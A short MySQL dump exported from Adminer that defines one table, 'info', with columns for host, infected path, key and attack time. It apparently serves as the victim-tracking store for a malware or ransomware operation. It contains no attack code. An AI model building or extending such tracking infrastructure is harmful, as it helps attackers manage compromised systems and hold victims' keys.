-- Adminer 4.2.5 MySQL dump

SET NAMES utf8;
SET time_zone = '+00:00';
SET foreign_key_checks = 0;
SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';

DROP TABLE IF EXISTS `info`;
CREATE TABLE `info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `host` varchar(255) NOT NULL,
  `path_infected` varchar(255) NOT NULL,
  `key` text NOT NULL,
  `attacked_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- 2019-02-20 10:49:12
